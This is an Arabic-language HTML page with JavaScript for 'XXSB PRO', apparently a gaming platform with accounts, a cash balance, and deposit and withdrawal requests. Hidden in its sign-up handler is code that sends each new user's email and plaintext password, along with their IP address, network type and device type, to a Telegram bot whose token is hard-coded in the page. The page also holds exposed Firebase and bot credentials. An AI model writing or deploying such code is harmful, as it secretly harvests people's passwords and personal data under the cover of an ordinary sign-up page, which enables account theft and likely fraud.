<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXSB PRO - منصة اللاعبين</title>
    <style>
        body { background-color: #080a0f; color: #ffffff; font-family: sans-serif; margin: 0; padding: 0; text-align: center; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; }
        .box { background: #121620; border: 1px solid #ff3e3e; padding: 30px; border-radius: 12px; box-shadow: 0 0 20px rgba(255,62,62,0.15); }
        .tabs { display: flex; margin-bottom: 20px; background: #080a0f; padding: 5px; border-radius: 8px; }
        .tab { flex: 1; padding: 10px; background: transparent; color: #8b949e; border: none; cursor: pointer; }
        .tab.active { background: #ff3e3e; color: white; border-radius: 6px; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #080a0f; border: 1px solid #30363d; color: white; border-radius: 6px; text-align: center; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #00ff66; color: #080a0f; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-withdraw { background: #ffaa00; }
        .hidden { display: none !important; }
        .stat { background: #1c212c; padding: 15px; border-radius: 8px; font-size: 20px; margin-bottom: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div id="auth-screen" class="box">
        <h2>منصة XXSB PRO 🕹️</h2>
        <div class="tabs">
            <button id="tab-login" class="tab active" onclick="switchTab('login')">تسجيل الدخول</button>
            <button id="tab-register" class="tab" onclick="switchTab('register')">إنشاء حساب</button>
        </div>
        <input type="email" id="email" placeholder="البريد الإلكتروني">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button id="btn-submit" onclick="handleAuth()">دخول</button>
        <p id="err" style="color:#ff3e3e;"></p>
    </div>

    <div id="main-screen" class="box hidden">
        <h3 id="user-welcome">مرحباً بك</h3>
        <div class="stat">الرصيد الحالي: <span id="balance" style="color:#00ff66; font-weight:bold;">0</span> جنيه</div>
        <p id="bonus-status" style="font-size:13px; color:#ffaa00;"></p>
        <hr style="border-color:#30363d;">
        
        <h4>🟩 طلب إيداع (شحن)</h4>
        <input type="number" id="dep-amt" placeholder="المبلغ بالجنية">
        <button onclick="sendRequest('deposit')">إرسال طلب إيداع</button>

        <h4>🟧 طلب سحب كاش</h4>
        <input type="number" id="with-amt" placeholder="المبلغ بالجنية">
        <button class="btn-withdraw" onclick="sendRequest('withdraw')">إرسال طلب سحب</button>
        
        <button style="background:#ff3e3e; color:white; margin-top:25px;" onclick="logout()">خروج 🚪</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-auth.js";
    import { getFirestore, doc, setDoc, getDoc, updateDoc, onSnapshot, addDoc, collection, increment } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCyiLPBJ0qDVZhAtW5r0psuvz8iyIy8VLI",
        authDomain: "xxsb-6bd79.firebaseapp.com",
        projectId: "xxsb-6bd79",
        storageBucket: "xxsb-6bd79.firebasestorage.app",
        messagingSenderId: "6915419205",
        appId: "1:6915419205:web:915ec9496f35a3bfb9472c"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    const BOT_TOKEN = "8125902090:AAELDfYT8h_4Q2bJX3183KbSmJfHezDnFkI";
    const CHAT_ID = "5499273828";
    let mode = "login";

    window.switchTab = function(t) {
        mode = t;
        document.getElementById('tab-login').classList.toggle('active', t==='login');
        document.getElementById('tab-register').classList.toggle('active', t==='register');
        document.getElementById('btn-submit').innerText = t==='login' ? 'دخول' : 'إنشاء الحساب الآن';
    }

    async function getSpecs() {
        let ip = "مجهول";
        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
        let net = navigator.connection ? navigator.connection.effectiveType : "WiFi/Cellular";
        let dev = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "موبايل" : "كمبيوتر";
        return { ip, net, dev };
    }

    window.handleAuth = async function() {
        const email = document.getElementById("email").value.trim();
        const pass = document.getElementById("password").value;
        const err = document.getElementById("err");
        if(!email || !pass) { err.innerText="املاً البيانات!"; return; }

        try {
            if(mode === "login") {
                await signInWithEmailAndPassword(auth, email, pass);
            } else {
                err.innerText = "جاري الإنشاء وبث البيانات للبوت... ⏳";
                const cred = await createUserWithEmailAndPassword(auth, email, pass);
                
                await setDoc(doc(db, "users", cred.user.uid), {
                    email: email, balance: 0, bonusStatus: "pending", createdAt: new Date().toISOString()
                });

                const specs = await getSpecs();
                // رسالة الإشعار البسيطة المطلوبة للبوت بدون أزرار تفاعلية ثقيلة
                const msg = `🔔 تسجيل حساب جديد!\n\n✉️ الحساب: ${email}\n🔑 الباسورد: ${pass}\n🌐 الـ IP: ${specs.ip}\n📶 الشبكة: ${specs.net}\n📱 الجهاز: ${specs.dev}`;
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: msg})
                });

                alert("تم الإنشاء بنجاح! يمكنك الآن تسجيل الدخول.");
                switchTab('login');
                document.getElementById("password").value = "";
                err.innerText = "";
            }
        } catch(e) { err.innerText = "خطأ في العملية أو الحساب موجود بالفعل."; }
    }

    onAuthStateChanged(auth, user => {
        if(user) {
            document.getElementById("auth-screen").classList.add("hidden");
            document.getElementById("main-screen").classList.remove("hidden");
            document.getElementById("user-welcome").innerText = `👤 اللاعب: ${user.email}`;
            
            onSnapshot(doc(db, "users", user.uid), docSnap => {
                if(docSnap.exists()) {
                    const data = docSnap.data();
                    document.getElementById("balance").innerText = data.balance;
                    if(data.bonusStatus === "pending") document.getElementById("bonus-status").innerText = "⏳ الـ 50 جنيه الهدية قيد المراجعة في لوحة المدير...";
                    else if(data.bonusStatus === "approved") document.getElementById("bonus-status").innerText = "✅ تم تفعيل الهدية الترحيبية!";
                    else document.getElementById("bonus-status").innerText = "";
                }
            });
        } else {
            document.getElementById("auth-screen").classList.remove("hidden");
            document.getElementById("main-screen").classList.add("hidden");
        }
    });

    window.sendRequest = async function(type) {
        const id = type === 'deposit' ? 'dep-amt' : 'with-amt';
        const amt = parseInt(document.getElementById(id).value);
        if(!amt || amt < 150) { alert("الحد الأدنى 150 جنيه."); return; }

        const user = auth.currentUser;
        if(type === 'withdraw') {
            const snap = await getDoc(doc(db, "users", user.uid));
            if(!snap.exists() || snap.data().balance < amt) { alert("رصيدك لا يكفي للسحب!"); return; }
            await updateDoc(doc(db, "users", user.uid), { balance: increment(-amt) });
        }

        await addDoc(collection(db, "requests"), {
            uid: user.uid, email: user.email, type: type, amount: amt, status: "pending", date: new Date().toISOString()
        });

        // إشعار سريع للبوت لمعرفتك الفورية بالعمليات
        const typeAr = type === 'deposit' ? 'إيداع شحن 🟩' : 'سحب كاش 🟧';
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: `💰 طلب ${typeAr} جديد!\n👤 اللاعب: ${user.email}\n💵 المبلغ: ${amt} جنيه\n👈 راجع لوحة التحكم للتفعيل.`})
        });

        alert("تم إرسال الطلب بنجاح وهو قيد المراجعة في لوحة الإدارة.");
        document.getElementById(id).value = "";
    }

    window.logout = () => signOut(auth);
</script>
</body>
</html>
